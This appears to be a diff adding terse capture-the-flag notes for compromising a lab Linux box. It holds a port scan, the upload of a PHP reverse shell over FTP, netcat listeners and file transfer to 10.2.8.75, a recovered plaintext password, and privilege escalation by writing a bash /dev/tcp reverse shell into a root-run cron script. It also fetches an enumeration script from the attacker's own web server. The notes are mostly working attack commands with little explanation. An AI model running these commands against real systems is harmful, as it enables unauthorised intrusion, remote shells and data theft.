@@ -1,0 +1,64 @@
+### PORTS
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+Maya
+
+put php-reverse-shell.php
+
+nc -lvnp 1234
+
+python -c ‘import pty; pty.spawn(“/bin/bash”)’
+
+cat recipe.txt
+
+
+found username=lennie in /home
+
+cd /incidents
+
+download suspicious.pcapng
+nc -l -p 1234 > suspicious.pcapng
+nc -w 3 10.2.8.75 1234 < suspicious.pcapng
+
+strings suspicious.pcapng
+
+passwd=c4ntg3t3n0ughsp1c3
+
+ssh to server
+
+Download the pspy32 script
+use python and wget.
+upload pspy32
+
+chmod +x pspy32
+./pspy32
+
+each minute it will run a script called planner.sh
+
+cat ~/scripts/planner.sh
+
+found /etc/print.sh can edit
+
+echo 'bash -c "bash -i >& /dev/tcp/10.2.8.75/8080 0>&1"' > /etc/print.sh
+
+### on attacker machine
+nc -lnvp 8080
+
+
+
+
+
+
+
+git clone https://github.com/rebootuser/LinEnum
+
+python3 -m http.server 9000
+
+wget http://<your-vpn-ip>:9000/LinEnum.sh
+
+./LinEnum.sh -r report -e /tmp -t
+
+
+c4ntg3t3n0ughsp1c3
